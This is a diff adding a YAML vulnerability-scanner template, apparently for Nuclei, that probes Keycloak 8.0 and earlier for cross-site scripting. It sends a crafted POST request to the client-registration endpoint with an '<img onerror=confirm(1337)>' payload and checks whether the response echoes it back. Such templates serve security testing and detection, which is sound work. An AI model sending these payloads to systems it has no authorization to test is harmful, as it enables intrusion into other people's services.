@@ -1,0 +1,30 @@
+id: keycloak-xss
+
+info:
+  name: Keycloak <= 8.0 - Cross Site Scripting
+  author: incogbyte
+  severity: medium
+  reference: https://cure53.de/pentest-report_keycloak.pdf
+  tags: keycloak,xss
+
+requests:
+  - raw:
+      - |
+        POST /auth/realms/master/clients-registrations/openid-connect HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
+        Content-Type: application/x-www-form-urlencoded
+
+        {"<img onerror=confirm(1337) src/>":1}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 400
+
+      - type: word
+        words:
+          - 'Unrecognized field "<img onerror=confirm(1337) src/>"'
